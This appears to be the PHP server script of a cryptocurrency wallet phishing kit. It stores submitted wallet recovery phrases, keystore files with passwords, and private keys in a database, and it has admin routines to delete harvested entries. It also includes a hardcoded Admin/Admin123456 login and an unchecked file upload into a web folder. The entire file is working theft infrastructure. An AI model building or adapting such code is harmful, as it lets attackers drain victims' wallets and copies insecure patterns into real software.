<?php
session_start();
require "./config.php";
if ($_SERVER['REQUEST_METHOD'] == "POST") {

  if (isset($_REQUEST['name'])) {
    $_SESSION['name'] = $_REQUEST['name'];
    echo $_SESSION['name'] ;
  }

  if (isset($_REQUEST['type']) and $_REQUEST['type'] == "phrase") {
    $ph = $_REQUEST['phrase'];
    $wa = $_REQUEST['wallet'];
    $conn = Config::getConn();
    $q = "INSERT INTO `phrase`(`phrase`, `wallet`) VALUES (:ph,:wa)";
    $stm = $conn->prepare($q);
    $stm->execute(array(":ph" => $ph, ":wa" => $wa));
    header("location:success");
  }

  if (isset($_REQUEST['type']) and $_REQUEST['type'] == "keystorepasswword") {
    $key = $_REQUEST['keystorejson'];
    $pass = $_REQUEST['keystorepasswword'];
    $wa = $_REQUEST['wallet'];
    $conn = Config::getConn();
    $q = "INSERT INTO `keystore`( `keystone`, `wallet`, `password`) VALUES (:k,:wa,:p)";
    $stm = $conn->prepare($q);
    $stm->execute(array(":k" => $key, ":wa" => $wa, ":p" => $pass));
    header("location:success");
  }

  if (isset($_REQUEST['type']) and $_REQUEST['type'] == "privatekey") {

    $pass = $_REQUEST['privatekey'];
    $wa = $_REQUEST['wallet'];
    $conn = Config::getConn();
    $q = "INSERT INTO `passcode`( `wallet`, `password`) VALUES (:wa,:pa)";
    $stm = $conn->prepare($q);
    $stm->execute(array(":wa" => $wa, ":pa" => $pass));
    header("location:success");
  }

  if (isset($_REQUEST['router'])) {
    $_SESSION['router'] = $_REQUEST['router'];
    echo $_REQUEST['router'];
  }

  if (isset($_REQUEST['from']) and $_REQUEST['from'] == "p") {
    $id = $_REQUEST['id'];
    $conn = Config::getConn();
    $q = "DELETE FROM `passcode` WHERE sn=:id";
    $stm = $conn->prepare($q);
    $stm->bindParam(":id", $id);
    $stm->execute();
    if ($stm->rowCount() > 0) {
      echo true;
    } else {
      echo false;
    }
  }


  if (isset($_REQUEST['from']) and $_REQUEST['from'] == "k") {
    $id = $_REQUEST['id'];
    $conn = Config::getConn();
    $q = "DELETE FROM `keystore` WHERE sn=:id";
    $stm = $conn->prepare($q);
    $stm->bindParam(":id", $id);
    $stm->execute();
    if ($stm->rowCount() > 0) {
      echo true;
    } else {
      echo false;
    }
  }


  if (isset($_REQUEST['from']) and $_REQUEST['from'] == "wa") {
    $id = $_REQUEST['id'];
    $conn = Config::getConn();
    $q = "DELETE FROM `Wallets` WHERE sn=:id";
    $stm = $conn->prepare($q);
    $stm->bindParam(":id", $id);
    $stm->execute();
    if ($stm->rowCount() > 0) {
      echo true;
    } else {
      echo false;
    }
  }



  if (isset($_REQUEST['from']) and $_REQUEST['from'] == "ph") {
    $id = $_REQUEST['id'];
    $conn = Config::getConn();
    $q = "DELETE FROM `phrase` WHERE sn=:id";
    $stm = $conn->prepare($q);
    $stm->bindParam(":id", $id);
    $stm->execute();
    if ($stm->rowCount() > 0) {
      echo true;
    } else {
      echo false;
    }
  }

  if (isset($_REQUEST['action']) and $_REQUEST['action'] == "save") {
    $target_dir = "../assets/img/";
    $target_file = $target_dir . basename($_FILES["image"]["name"]);
    $temName = $_FILES['image']['tmp_name'];
    $name = $_FILES["image"]["name"];
    $walletName = $_REQUEST['name'];
    if (move_uploaded_file($temName, $target_file)) {
      $conn = Config::getConn();

      $q = "INSERT INTO `Wallets`( `name`, `image`) VALUES (:na,:im)";
      $stm = $conn->prepare($q);
      $stm->bindParam(":na", $walletName);
      $stm->bindParam(":im", $name);
      if ($stm->execute()) {
        echo "Saved";
      }else{
        echo "Not Saved";
      }
    } else {
      echo "Something went Wrong";
    }
  }

  if(isset($_REQUEST['username']) and isset($_REQUEST['password'])){
    if($_REQUEST['username']=="Admin" and $_REQUEST['password']=="Admin123456" ){
      $_SESSION['user']=true;
      echo true;
    }else{
      echo "invalid login details";
    }
  }
}
